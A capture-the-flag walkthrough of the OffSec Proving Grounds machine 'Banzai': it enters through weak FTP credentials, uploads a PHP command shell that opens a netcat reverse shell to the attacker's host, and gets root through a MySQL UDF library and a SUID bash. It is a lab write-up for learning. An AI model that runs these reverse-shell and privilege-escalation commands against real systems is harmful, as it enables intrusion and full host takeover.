---
title: "PG: Banzai"
date: 2022-12-12
draft: false
os: "Linux"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/banzai/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - linux
  - ftp
  - weak-credentials
  - mysql
  - udf
  - privilege-escalation
categories:
  - walkthrough
---

{{< box-info name="Banzai" os="Linux" difficulty="Medium" ip="192.168.89.56" platform="OffSec Proving Grounds" >}}

---

## Recon

### Nmap

{{< collapse title="Full nmap output" >}}
```
20/tcp   closed ftp-data
21/tcp   open   ftp        vsftpd 3.0.3
22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
25/tcp   open   smtp       Postfix smtpd
5432/tcp open   postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.19
8080/tcp open   http       Apache httpd 2.4.25
8295/tcp open   http       Apache httpd 2.4.25 ((Debian))
```
{{< /collapse >}}

---

## Enumeration

### Port 21 - FTP

No anonymous access. No public exploits for vsftpd 3.0.3 (aside from DoS).

### Port 25 - SMTP

User enumeration with Hydra and `smtp-user-enum` revealed standard system accounts plus `admin`, `ftp`, `mysql`, `postgres`.

### Port 8080 & 8295 - Web Apps

Two Apache instances. Port 8295 hosts a web application.

---

## Foothold

### Weak FTP Credentials

Tried common creds on FTP and got in with `admin:admin`.

The FTP root maps to the web application's document root on port 8295. Uploaded a PHP command shell:

```bash
# Upload cmd shell via FTP
ftp 192.168.89.56
> put cmd.php

# Trigger reverse shell
curl "http://192.168.206.56:8295/cmd.php?cmd=nc+-nv+192.168.49.206+8295+-e+/bin/bash"
```

![MySQL credentials in config.php](/images/banzai/init-access.png)

---

## Privilege Escalation

### MySQL UDF (User Defined Functions)

In the web root, one directory up from our landing, there's a `config.php` with MySQL credentials: `root:EscalateRaftHubris123`.

Checking the MySQL config:

```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
# user = root
```

MySQL is running as **root**. This means we can escalate via UDF.

### UDF Exploitation Steps

1. Located the malicious library:

```bash
locate "*lib_mysqludf_sys*"
```

2. Uploaded `lib_mysqludf_sys.so` (x64, from Metasploit) to `/var/www/` on the target.

3. Loaded it into MySQL:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/var/www/lib_mysqludf_sys.so'));
select * from foo;  -- verify it's not NULL
show variables like '%plugin%';
select * from foo into dumpfile '/usr/lib/mysql/plugin/raps.so';
create function sys_eval returns integer soname 'raps.so';
```

![Available UDF functions](/images/banzai/mysql-lib.png)

4. Created a SUID bash:

```sql
\! cp /bin/bash .
select sys_eval('chmod u+s /var/www/bash');
\! ./bash -p
```

Root.

---

## Proof

{{< terminal title="proof" >}}
local.txt: [redacted]
proof.txt: [redacted]
{{< /terminal >}}

![Proof](/images/banzai/proof.png)

---

## Key Takeaways

{{< callout type="note" >}}
- Always try default/weak credentials on services like FTP (`admin:admin`)
- When FTP root maps to a web root, it's a direct path to code execution
- Check what user MySQL runs as -- if it's root, UDF is a reliable privesc path
- Look for database credentials in web application config files (`config.php`, `.env`, etc.)
{{< /callout >}}
